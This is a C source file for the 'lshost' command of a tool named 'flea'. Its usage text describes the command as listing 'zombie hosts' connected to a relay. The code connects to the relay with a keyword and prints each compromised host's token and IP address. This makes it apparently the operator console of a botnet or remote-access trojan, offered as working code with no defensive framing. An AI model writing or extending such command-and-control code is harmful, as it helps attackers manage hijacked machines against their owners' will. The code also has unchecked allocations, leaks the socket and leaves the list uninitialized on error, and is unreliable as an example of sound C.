#include "tunnel.h"
#include "config.h"
#include "protocol/dispatcher.h"

#include <ax/event.h>
#include <ax/option.h>

#include <ax/socket.h>
#include <stdlib.h>
#include <inttypes.h>
#include <errno.h>
#include <stdio.h>
#include <stdint.h>
struct tunnel;

struct relay_host_list
{
        struct relay_host {
                uint32_t token;
                char address[20];
                struct relay_host *next;
        } *head;
};

static void relay_host_list_free(struct relay_host_list *list);

static int relay_lshost(ax_socket relay, struct relay_host_list *list);

static void relay_host_list_free(struct relay_host_list *list)
{
	for (struct relay_host *h = list->head; h; ) {
		struct relay_host *tmp = h->next;
		free(h);
		h = tmp;
	}
}

static int relay_lshost(ax_socket relay, struct relay_host_list *list)
{
	uint8_t id = MSG_RLY_LSSVR;
	if (ax_socket_syncsend(relay, &id, sizeof id))
		return -1;

	if (ax_socket_syncrecv(relay, &id, sizeof id))
		return -1;
	
	if (id != MSG_RLY_LSSVR)
		return -1;
	struct msg_host_set host_set;

	if (ax_socket_syncrecv(relay, &host_set, sizeof host_set))
		return -1;
	struct relay_host **p = &list->head;
	for (int i = 0; i < host_set.count; i++) {
		struct msg_host_info host;
		if (ax_socket_syncrecv(relay, &host, sizeof host))
			return -1;
		struct relay_host *host_node = malloc(sizeof *host_node);
		struct in_addr inaddr = { .s_addr = host.inaddr };
		strcpy(host_node->address, inet_ntoa(inaddr));
		host_node->token = host.token;
		*p = host_node;
		p = &host_node->next;
	}
	*p = NULL;
	return 0;
}

static void usage_lshost()
{
	fputs("Usage: flea lshost OPTIONS...\n\n"
	      "Options:\n"
	      "    List zombie hosts which connected to relay.\n\n"
	      "    -r <address>  specifies relay server address\n"
	      "    -p <keyword>  specifies relay keyword\n"
	, stderr);
}

int cmd_lshost(int argc, char **argv)
{
	struct ax_option_st options;
	ax_option_init(&options, argv);
	const char *relay_addr = NULL;
	const char *keyword = NULL;
	for (int op; (op = ax_option_parse(&options, "r:p:h")) != -1;) {
		switch (op) {
			case 'r':
				relay_addr = options.optarg;
				break;
			case 'p':
				keyword = options.optarg;
				break;
			case 'h':
				usage_lshost();
				return 0;
			default:
				fprintf(stderr, "Unsupported option -%c\n", options.optopt);
				usage_lshost();
				return 1;
		}
	}

	if (argc - options.optind >= 1) {
		fprintf(stderr, "Unexpected argument %s\n", argv[options.optind]);
		usage_lshost();
		return 1;
	}

	if (!relay_addr) {
		fprintf(stderr, "Option -r expected\n");
		return 1;
	}

	if (!keyword) {
		fprintf(stderr, "Option -p expected\n");
		return 1;
	}
	
	ax_socket relay = tunnel_open(keyword, relay_addr, CONFIG_CLIENT_PORT, 0, 0);
	if (relay == AX_SOCKET_INVALID) {
		ax_perror("Failed to connect to relay service");
		return 1;
	}
	struct relay_host_list list;
	if(relay_lshost(relay, &list))
		return 1;
	for (struct relay_host *h = list.head; h; h = h->next) {
		printf("%d\t%s\n", h->token, h->address);
	}
	relay_host_list_free(&list);
	ax_socket_close(relay);
	return 0;
}
